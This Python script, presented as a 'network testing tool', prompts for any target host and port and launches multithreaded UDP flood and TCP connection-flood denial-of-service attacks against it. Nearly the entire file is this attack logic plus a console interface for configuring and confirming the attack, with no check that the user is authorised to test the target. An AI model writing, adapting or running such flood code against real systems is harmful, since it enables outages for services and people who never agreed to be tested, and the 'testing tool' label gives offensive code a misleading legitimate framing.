import socket
import threading
import time
import os
import platform
import subprocess
import random

def ping_host(target, timeout=1000):
    """
    Ping a host to check if it's reachable with detailed error handling
    """
    print(f"[PING] Attempting to ping {target}...")
    time.sleep(1)
    
    if not target or not isinstance(target, str):
        print("[PING] Error: Invalid target format")
        return False, "Invalid target: must be a non-empty string"
    
    print("[PING] Detecting operating system...")
    time.sleep(0.5)
    
    if platform.system().lower() == "windows":
        print("[PING] Windows detected, using Windows ping command")
        ping_cmd = ["ping", "-n", "1", "-w", str(timeout), target]
    else:
        print("[PING] Unix-like system detected, using Unix ping command")
        ping_cmd = ["ping", "-c", "1", "-W", str(timeout // 1000), target]
    
    time.sleep(1)
    print(f"[PING] Executing: {' '.join(ping_cmd)}")
    
    try:
        print("[PING] Starting ping process...")
        result = subprocess.run(
            ping_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=(timeout/1000) + 2
        )
        
        print("[PING] Ping process completed, analyzing results...")
        time.sleep(1)
        
        if result.returncode == 0:
            print("[PING] Ping successful - target is reachable")
            return True, f"Success: {target} is reachable"
        else:
            print("[PING] Ping failed - analyzing error type...")
            error_output = result.stderr.strip() or result.stdout.strip()
            
            if "Destination host unreachable" in error_output:
                print("[PING] Error: Destination host unreachable")
                return False, f"Error: {target} is unreachable (no route to host)"
            elif "Request timed out" in error_output or "timeout" in error_output.lower():
                print("[PING] Error: Request timed out")
                return False, f"Error: Request to {target} timed out"
            elif "Could not find host" in error_output or "Name or service not known" in error_output:
                print("[PING] Error: Hostname could not be resolved")
                return False, f"Error: Hostname {target} could not be resolved"
            elif "Transmit failed" in error_output:
                print("[PING] Error: Transmission failed")
                return False, f"Error: Transmission to {target} failed"
            else:
                print("[PING] Error: General failure")
                return False, f"Error: {target} is not reachable (general failure)"
                
    except subprocess.TimeoutExpired:
        print("[PING] Error: Ping command timed out")
        return False, f"Error: Ping command to {target} timed out"
    except FileNotFoundError:
        print("[PING] Error: Ping command not found")
        return False, "Error: Ping command not found. Is your network configured properly?"
    except PermissionError:
        print("[PING] Error: Permission denied")
        return False, "Error: Permission denied to execute ping command"
    except Exception as e:
        print(f"[PING] Unexpected error: {e}")
        return False, f"Unexpected error pinging {target}: {str(e)}"

def attack_udp(target, port, duration, thread_id):
    """UDP flood attack"""
    print(f"[THREAD-{thread_id}] Initializing UDP attack on {target}:{port}")
    time.sleep(1)
    
    # Create a UDP socket
    print(f"[THREAD-{thread_id}] Creating UDP socket...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate some random bytes to send
    print(f"[THREAD-{thread_id}] Generating random data payload...")
    bytes_to_send = random._urandom(1024)
    
    timeout = time.time() + duration
    sent_packets = 0
    
    print(f"[THREAD-{thread_id}] Starting attack loop for {duration} seconds...")
    
    try:
        while time.time() < timeout:
            # Send UDP packets to the target
            sock.sendto(bytes_to_send, (target, port))
            sent_packets += 1
            
            # Print status every 10 packets
            if sent_packets % 10 == 0:
                print(f"[THREAD-{thread_id}] Sent {sent_packets} packets to {target}:{port}")
                time.sleep(0.1)  # Small delay to make output readable
                
    except Exception as e:
        print(f"[THREAD-{thread_id}] Error: {e}")
    finally:
        sock.close()
        print(f"[THREAD-{thread_id}] Attack completed. Sent {sent_packets} packets.")

def attack_tcp(target, port, duration, thread_id):
    """TCP SYN flood attack"""
    print(f"[THREAD-{thread_id}] Initializing TCP SYN flood on {target}:{port}")
    time.sleep(1)
    
    timeout = time.time() + duration
    sent_packets = 0
    
    print(f"[THREAD-{thread_id}] Starting attack loop for {duration} seconds...")
    
    try:
        while time.time() < timeout:
            # Create a new socket each time
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            
            # Try to connect (SYN packet)
            try:
                s.connect((target, port))
            except:
                # We expect this to fail - that's the point of a SYN flood
                pass
            finally:
                s.close()
                
            sent_packets += 1
            
            # Print status every 10 packets
            if sent_packets % 10 == 0:
                print(f"[THREAD-{thread_id}] Sent {sent_packets} SYN packets to {target}:{port}")
                time.sleep(0.1)  # Small delay to make output readable
                
    except Exception as e:
        print(f"[THREAD-{thread_id}] Error: {e}")
    finally:
        print(f"[THREAD-{thread_id}] Attack completed. Sent {sent_packets} SYN packets.")

def main():
    print("=" * 60)
    print("StationFlyer's Network Testing Tool")
    print("=" * 60)
    print("Initializing system check...")
    time.sleep(1)
    print("System check complete. Tool ready.")
    print("=" * 60)
    time.sleep(2)
    
    print("[INPUT] Requesting target information...")
    target = input("Enter target IP or hostname: ").strip()
    print(f"[INPUT] Target set to: {target}")
    
    # Ping verification
    print(f"\n[VERIFY] Starting connectivity verification to {target}...")
    success, message = ping_host(target)
    
    if success:
        print(f"[VERIFY] ✓ {message}")
    else:
        print(f"[VERIFY] ✗ {message}")
        print("[CONFIRM] Target may be unreachable. Requesting confirmation to continue...")
        confirm = input("Continue anyway? (y/n): ").lower()
        if confirm != 'y':
            print("[CANCEL] Operation cancelled by user.")
            return
    
    # Get attack parameters
    print("\n[CONFIG] Starting attack configuration...")
    try:
        print("[CONFIG] Requesting port number...")
        port = int(input("Enter target port (default 80): ") or "80")
        print(f"[CONFIG] Port set to: {port}")
        
        print("[CONFIG] Requesting attack duration...")
        duration = int(input("Enter attack duration in seconds (default 30): ") or "30")
        print(f"[CONFIG] Duration set to: {duration} seconds")
        
        print("[CONFIG] Requesting thread count...")
        threads = int(input("Enter number of threads (default 5): ") or "5")
        print(f"[CONFIG] Threads set to: {threads}")
        
        print("[CONFIG] Requesting attack type...")
        attack_type = input("Enter attack type (udp/tcp, default udp): ").lower() or "udp"
        print(f"[CONFIG] Attack type set to: {attack_type.upper()}")
        
        if attack_type not in ['udp', 'tcp']:
            print("[CONFIG] Invalid attack type detected. Defaulting to UDP.")
            attack_type = 'udp'
            
    except ValueError:
        print("[CONFIG] Invalid input detected. Using default values.")
        port = 80
        duration = 30
        threads = 5
        attack_type = 'udp'
    
    # Final confirmation
    print(f"\n[SUMMARY] Attack configuration complete:")
    print(f"[SUMMARY] Target: {target}:{port}")
    print(f"[SUMMARY] Type: {attack_type.upper()}")
    print(f"[SUMMARY] Duration: {duration} seconds")
    print(f"[SUMMARY] Threads: {threads}")
    
    print("[CONFIRM] Requesting final confirmation...")
    confirm = input("Type 'CONFIRM' to proceed: ")
    
    if confirm != 'CONFIRM':
        print("[CANCEL] Attack cancelled by user.")
        return
    
    # Launch attack
    print(f"\n[LAUNCH] Starting attack sequence...")
    for i in range(3, 0, -1):
        print(f"[LAUNCH] Starting in {i}...")
        time.sleep(1)
    
    attack_threads = []
    
    print(f"[THREADS] Initializing {threads} attack threads...")
    for i in range(threads):
        if attack_type == 'udp':
            thread = threading.Thread(target=attack_udp, args=(target, port, duration, i+1))
        else:
            thread = threading.Thread(target=attack_tcp, args=(target, port, duration, i+1))
        
        thread.daemon = True
        thread.start()
        attack_threads.append(thread)
        print(f"[THREADS] Thread {i+1}/{threads} started")
        time.sleep(0.2)
    
    # Wait for all threads to complete
    print(f"\n[STATUS] Attack running. Monitoring progress for {duration} seconds...")
    
    for remaining in range(duration, 0, -1):
        if remaining % 10 == 0 or remaining <= 5:
            print(f"[STATUS] Time remaining: {remaining} seconds")
        time.sleep(1)
    
    print("\n" + "=" * 60)
    print("[COMPLETE] Attack finished!")
    print("=" * 60)
    print("[INFO] Note: Some threads may continue for a few more seconds")
    print("[INFO] Tool execution complete.")

if __name__ == "__main__":
    main()